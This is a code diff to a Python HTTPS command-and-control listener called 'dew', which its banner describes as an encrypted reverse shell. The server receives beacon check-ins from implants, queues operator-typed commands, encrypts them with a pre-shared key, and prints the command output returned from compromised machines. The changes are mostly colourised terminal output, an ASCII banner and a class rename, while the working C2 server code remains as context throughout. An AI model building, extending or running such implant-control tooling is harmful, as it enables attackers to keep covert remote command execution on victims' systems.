@@ -27,6 +27,22 @@ NONCE_SIZE = 24
 MAC_SIZE = 16
 KEY_SIZE = 32
 
+# ── catppuccin mocha ──
+C_BLUE = "\033[38;2;137;180;250m"
+C_SAPPHIRE = "\033[38;2;116;199;236m"
+C_TEAL = "\033[38;2;148;226;213m"
+C_GREEN = "\033[38;2;166;227;161m"
+C_RED = "\033[38;2;243;139;168m"
+C_MAUVE = "\033[38;2;203;166;247m"
+C_PEACH = "\033[38;2;250;179;135m"
+C_TEXT = "\033[38;2;205;214;244m"
+C_SUBTEXT = "\033[38;2;166;173;200m"
+C_OVERLAY = "\033[38;2;108;112;134m"
+C_SURFACE = "\033[38;2;69;71;90m"
+C_RESET = "\033[0m"
+C_BOLD = "\033[1m"
+C_DIM = "\033[2m"
+
 # ── globals ──
 g_key = None
 g_cmd_queue = queue.Queue()
@@ -41,13 +57,13 @@ def hex_decode_key(hex_str):
 
 
 def encrypt_msg(key, plaintext):
-    """Encrypt plaintext -> [nonce(24)][mac(16)][ciphertext] to match C wire format."""
+    """Encrypt plaintext -> [nonce(24)][mac(16)][ct] wire format."""
     nonce = os.urandom(NONCE_SIZE)
     # PyNaCl returns ciphertext || mac (mac is last 16 bytes)
     ct_with_mac = crypto_aead_xchacha20poly1305_ietf_encrypt(
         plaintext, None, nonce, key
     )
-    # Rearrange to [nonce][mac][ciphertext] to match C's crypto_aead_lock layout
+    # Rearrange to [nonce][mac][ct] for C's crypto_aead_lock
     ciphertext = ct_with_mac[:-MAC_SIZE]
     mac = ct_with_mac[-MAC_SIZE:]
     return nonce + mac + ciphertext
@@ -74,7 +90,7 @@ def decrypt_msg(key, data):
         return None
 
 
-class TinygetHandler(BaseHTTPRequestHandler):
+class DewHandler(BaseHTTPRequestHandler):
     """HTTP request handler for implant callbacks."""
 
     def log_message(self, format, *args):
@@ -105,7 +121,11 @@ class TinygetHandler(BaseHTTPRequestHandler):
         beacon_hex = beacon.hex()
         src_ip = self.client_address[0]
         with g_lock:
-            print(f"\r[*] Beacon {beacon_hex[:8]} check-in from {src_ip}")
+            print(
+                f"\r{C_TEAL}[*]{C_RESET} Beacon "
+                f"{C_SAPPHIRE}{beacon_hex[:8]}{C_RESET} "
+                f"check-in from {C_TEXT}{src_ip}{C_RESET}"
+            )
             sys.stdout.flush()
 
         # Check for queued command
@@ -132,9 +152,11 @@ class TinygetHandler(BaseHTTPRequestHandler):
             self.end_headers()
             return
 
+        output = plaintext.decode("utf-8", errors="replace")
         with g_lock:
-            print(f"\r[+] Result:\n{plaintext.decode('utf-8', errors='replace')}")
-            print("dew> ", end="", flush=True)
+            print(f"\r{C_GREEN}[+]{C_RESET} Result:")
+            print(f"{C_TEXT}{output}{C_RESET}")
+            print(f"{C_MAUVE}dew>{C_RESET} ", end="", flush=True)
 
         self.send_response(200)
         self.end_headers()
@@ -146,7 +168,7 @@ def generate_self_signed_cert():
     key_file = os.path.join(tempfile.gettempdir(), "dew_key.pem")
 
     if not os.path.exists(cert_file) or not os.path.exists(key_file):
-        print("[*] Generating self-signed certificate...")
+        print(f"{C_BLUE}[*]{C_RESET} Generating self-signed certificate...")
         subprocess.run([
             "openssl", "req", "-x509", "-newkey", "rsa:2048",
             "-keyout", key_file, "-out", cert_file,
@@ -157,16 +179,51 @@ def generate_self_signed_cert():
     return cert_file, key_file
 
 
+def print_banner(lhost, lport, key_hex):
+    """Print startup banner in Catppuccin Mocha colors."""
+    print()
+    print(f"  {C_BLUE}{C_BOLD}      _            {C_RESET}")
+    print(f"  {C_SAPPHIRE}{C_BOLD}   __| | _____      __ {C_RESET}")
+    print(f"  {C_TEAL}{C_BOLD}  / _` |/ _ \\ \\ /\\ / / {C_RESET}")
+    print(f"  {C_GREEN}{C_BOLD} | (_| |  __/\\ V  V /  {C_RESET}")
+    print(f"  {C_GREEN}{C_BOLD}  \\__,_|\\___| \\_/\\_/   {C_RESET}")
+    print()
+    print(
+        f"  {C_OVERLAY}encrypted https reverse shell{C_RESET}"
+    )
+    print(
+        f"  {C_SURFACE}{'─' * 36}{C_RESET}"
+    )
+    print(
+        f"  {C_BLUE}[*]{C_RESET} Listening on "
+        f"{C_TEXT}https://{lhost}:{lport}{C_RESET}"
+    )
+    print(
+        f"  {C_BLUE}[*]{C_RESET} PSK: "
+        f"{C_PEACH}{key_hex[:8]}{C_OVERLAY}...{C_PEACH}{key_hex[-8:]}{C_RESET}"
+    )
+    print(
+        f"  {C_SURFACE}{'─' * 36}{C_RESET}"
+    )
+    print()
+
+
 def interactive_prompt():
     """Interactive command prompt running in a separate thread."""
-    print("\n[*] Listener ready. Type commands to queue for the implant.")
-    print("[*] Type 'exit' to send EXIT to implant and shut down.\n")
+    print(
+        f"{C_BLUE}[*]{C_RESET} Listener ready. "
+        f"Type commands to queue for the implant."
+    )
+    print(
+        f"{C_BLUE}[*]{C_RESET} Type "
+        f"{C_RED}'exit'{C_RESET} to send EXIT to implant.\n"
+    )
 
     while True:
         try:
-            cmd = input("dew> ")
+            cmd = input(f"{C_MAUVE}dew>{C_RESET} ")
         except (EOFError, KeyboardInterrupt):
-            print("\n[*] Shutting down...")
+            print(f"\n{C_RED}[!]{C_RESET} Shutting down...")
             os._exit(0)
 
         cmd = cmd.strip()
@@ -174,12 +231,17 @@ def interactive_prompt():
             continue
 
         if cmd.lower() == "exit":
-            print("[*] Sending EXIT command to implant...")
+            print(
+                f"{C_PEACH}[*]{C_RESET} Sending EXIT command to implant..."
+            )
             g_cmd_queue.put("EXIT")
             continue
 
         g_cmd_queue.put(cmd)
-        print(f"[*] Command queued: {cmd}")
+        print(
+            f"{C_BLUE}[*]{C_RESET} Command queued: "
+            f"{C_SUBTEXT}{cmd}{C_RESET}"
+        )
 
 
 def main():
@@ -188,20 +250,26 @@ def main():
     parser = argparse.ArgumentParser(description="dew listener")
     parser.add_argument("--lhost", default="0.0.0.0", help="Listen address")
     parser.add_argument("--lport", type=int, default=443, help="Listen port")
-    parser.add_argument("--key", required=True, help="64-char hex PSK (shared with implant)")
+    parser.add_argument(
+        "--key", required=True,
+        help="64-char hex PSK (shared with implant)"
+    )
     parser.add_argument("--cert", help="Path to TLS certificate")
     parser.add_argument("--cert-key", help="Path to TLS private key")
     args = parser.parse_args()
 
     if not HAS_NACL:
-        print("[!] PyNaCl is required. Install with: pip install pynacl")
+        print(
+            f"{C_RED}[!]{C_RESET} PyNaCl is required. "
+            f"Install with: {C_TEXT}pip install pynacl{C_RESET}"
+        )
         sys.exit(1)
 
     # Decode PSK
     try:
         g_key = hex_decode_key(args.key)
     except ValueError as e:
-        print(f"[!] Invalid key: {e}")
+        print(f"{C_RED}[!]{C_RESET} Invalid key: {e}")
         sys.exit(1)
 
     # TLS certificate
@@ -211,13 +279,12 @@ def main():
         cert_file, key_file = generate_self_signed_cert()
 
     # Setup HTTPS server
-    server = HTTPServer((args.lhost, args.lport), TinygetHandler)
+    server = HTTPServer((args.lhost, args.lport), DewHandler)
     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)
     server.socket = ctx.wrap_socket(server.socket, server_side=True)
 
-    print(f"[*] dew listener on https://{args.lhost}:{args.lport}")
-    print(f"[*] PSK: {args.key[:8]}...{args.key[-8:]}")
+    print_banner(args.lhost, args.lport, args.key)
 
     # Start interactive prompt in background
     prompt_thread = threading.Thread(target=interactive_prompt, daemon=True)
@@ -227,7 +294,7 @@ def main():
     try:
         server.serve_forever()
     except KeyboardInterrupt:
-        print("\n[*] Shutting down listener.")
+        print(f"\n{C_RED}[!]{C_RESET} Shutting down listener.")
         server.shutdown()
 
 
